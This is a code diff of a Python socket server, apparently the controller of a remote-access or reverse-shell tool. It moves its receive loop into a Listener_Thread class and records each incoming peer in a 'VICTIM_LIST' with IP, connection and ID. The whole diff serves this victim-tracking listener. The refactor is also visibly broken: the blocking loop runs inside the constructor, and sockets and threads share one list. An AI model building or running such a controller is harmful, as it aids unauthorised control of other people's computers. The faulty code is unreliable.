@@ -1,30 +1,37 @@
 import settings
 import threading
+from queue import Queue
 import socketserver
 import socket
 from _thread import *
 import time
 import sys
 
+class Listener_Thread(threading.Thread):
+    def __init__(self, queue, conn, addr, args=(), kwargs=None):
+        threading.Thread.__init__(self, args=(), kwargs=None)
+        self.queue = queue
+        self.daemon = True
+        self.accept_connections(conn, addr)
 
-def accept_connections(conn, addr):
-    for c in settings.ALL_CONNECTIONS:
-        c.close()
-    del settings.ALL_CONNECTIONS[:]
-    del settings.ALL_CONNECTIONS[:]
+    def accept_connections(self, conn, addr):
+        for c in settings.ALL_CONNECTIONS:
+            c.close()
+        del settings.ALL_CONNECTIONS[:]
+        del settings.ALL_CONNECTIONS[:]
     
-    while 1:
-        ans = conn.recv(1024).decode()
-        sys.stdout.write(ans)
-        settings.ALL_CONNECTIONS.append(conn)
-        settings.ALL_ADDRESSES.append(addr)
+        while 1:
+            ans = conn.recv(1024).decode()
+            sys.stdout.write(ans)
+            settings.ALL_CONNECTIONS.append(conn)
+            settings.ALL_ADDRESSES.append(addr)
         
-        for ips in settings.VICTIM_LIST:
-            if ips['IP'] != addr:
-                settings.VICTIM_LIST[settings.VICTIM_CTR]['IP'] = addr
-                settings.VICTIM_LIST[settings.VICTIM_CTR]['CONNECTION'] = conn
-                settings.VICTIM_LIST[settings.VICTIM_CTR]['ID'] = settings.VICTIM_CTR + 1
-                settings.VICTIM_CTR += 1
+            for ips in settings.VICTIM_LIST:
+                if ips['IP'] != addr:
+                    settings.VICTIM_LIST[settings.VICTIM_CTR]['IP'] = addr
+                    settings.VICTIM_LIST[settings.VICTIM_CTR]['CONNECTION'] = conn
+                    settings.VICTIM_LIST[settings.VICTIM_CTR]['ID'] = settings.VICTIM_CTR + 1
+                    settings.VICTIM_CTR += 1
                 
         
         
@@ -40,9 +47,9 @@ def create_server(ip, port):
     conn, addr = s.accept()
     conn.setblocking(1)
 
-    th = threading.Thread(target=accept_connections, args=(conn, addr))
-    th.daemon = True
-    th.start()
+    q = Queue()
+    settings.ALL_CONNECTIONS.append(Listener_Thread(q, conn, addr))
+    settings.ALL_CONNECTIONS[settings.VICTIM_CTR].start()
     
 
 
